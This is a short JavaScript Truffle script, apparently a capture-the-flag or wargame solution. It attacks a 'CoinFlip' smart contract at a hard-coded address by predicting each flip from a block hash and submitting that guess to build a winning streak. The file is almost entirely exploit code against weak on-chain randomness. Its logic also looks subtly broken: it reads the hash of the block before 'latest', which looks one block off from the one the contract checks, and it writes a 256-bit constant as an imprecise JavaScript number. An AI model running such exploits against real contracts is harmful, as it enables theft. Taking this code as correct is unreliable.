const CoinFlip = artifacts.require("CoinFlip");

module.exports = async (callback) => {
  try {
    const coinFlip = await CoinFlip.at(
      "0xf67278389ec701e5c84a6b2ce6b5d78e0d7e27c6"
    );
    let web3 = CoinFlip.web3;
    let block = await web3.eth.getBlock("latest");
    let guessBlock = await web3.eth.getBlock(block.number - 1);
    let guessHash = guessBlock.hash;
    const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    let guessValue = guessHash / FACTOR;
    let guess = parseInt(guessValue) == 1 ? true : false;

    console.log(`Guessing: ${guess}`);
    await coinFlip.flip(guess);

    let streak = await coinFlip.consecutiveWins();
    console.log("Winning streak:", streak);
    // const guess = false;

    // const receipt = await coinFlip.flip(guess);
    // console.log(receipt);
  } catch (err) {
    console.log("Oops: ", err.message);
  }
  callback();
};
